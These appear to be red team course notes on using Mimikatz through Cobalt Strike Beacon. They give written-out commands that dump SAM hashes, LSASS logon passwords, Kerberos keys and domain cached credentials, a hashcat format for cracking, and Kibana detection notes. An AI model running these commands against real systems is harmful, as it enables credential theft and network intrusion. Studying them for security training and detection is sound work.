

Cannot run multiple commands like in console:

``PS C:\Tools\mimikatz\x64> .\mimikatz.exe token::elevate lsadump::sam exit``

Instead use :

`!` to elevate privilege
`@` impersonate Beacon's thread token before running the command

`@` option is useful in cases where Mimikatz needs to interact with a remote system, such as with dcsync.

So in the example above, the correct Cobalt Strike syntax would be:

``beacon> mimikatz !lsadump::sam``


## NTLM Hashes

Dump passwords from memory, even plaintext sometimes. Useful for **Pass the Hash**

```
mimikatz !sekurlsa::logonpasswords
```

Cobalt Strike also has a short-hand command for this called `logonpasswords`.  After dumping these credentials, go to _View > Credentials_ to see a copy of them

Dump the Kerberos encryption keys of currently logged on users, it's more common to use Kerberos in modern systems so we can blend in easier.  These keys can be used in a variety of Kerberos abuse scenarios.

```
mimikatz !sekurlsa::ekeys
```

> [!info] 
> There is a [known issue](https://github.com/gentilkiwi/mimikatz/issues/314) where Mimikatz may incorrectly label all of the hashes as `des_cbc_md4`.
> The order is :
> 
> ```
aes256_hmac       4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6
rc4_hmac_nt       59fc0f884922b4ce376051134c71e22c
rc4_hmac_old      59fc0f884922b4ce376051134c71e22c
rc4_md4           59fc0f884922b4ce376051134c71e22c
rc4_hmac_nt_exp   59fc0f884922b4ce376051134c71e22c
rc4_hmac_old_exp  59fc0f884922b4ce376051134c71e22c2c

> [!warning] 
> Requires elevated privileges.

> [!danger] 
> OPSEC: This modules will open a read handle to LSASS which can be logged under event 4656. Use the "Suspicious Handle to LSASS" saved search in Kibana to see them. 


## Domain Cached Credentials

The local device caches the domain credentials so authentication can happen locally, but these can be extracted and cracked offline to recover plaintext credentials.

Unfortunately, the hash format is not NTLM so it can't be used with pass the hash.  The only viable use for these is to crack them offline.

Mimikatz module can extract these from `HKLM\SECURITY`.

```
mimikatz !lsadump::cache
```

To crack these with [hashcat](https://hashcat.net/hashcat/), we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be `$DCC2$<iterations>#<username>#<hash>`.
```
2100|Domain Cached Credentials 2 (DCC2), MS Cache 2|$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f
```

> [!warning] 
>  DCC is much much slower to crack than NTLM.

> [!danger] 
> This module will open a handle to the SECURITY registry hive.  Use the "Suspicious SECURITY Hive Handle" saved search in Kibana to see them.

## Extracting Kerberos Tickets

[Red Team Ops - Zero-Point Security (zeropointsecurity.co.uk)](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/38189179-extracting-kerberos-tickets)

## DCSync

[Red Team Ops - Zero-Point Security (zeropointsecurity.co.uk)](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/38742955-dcsync)
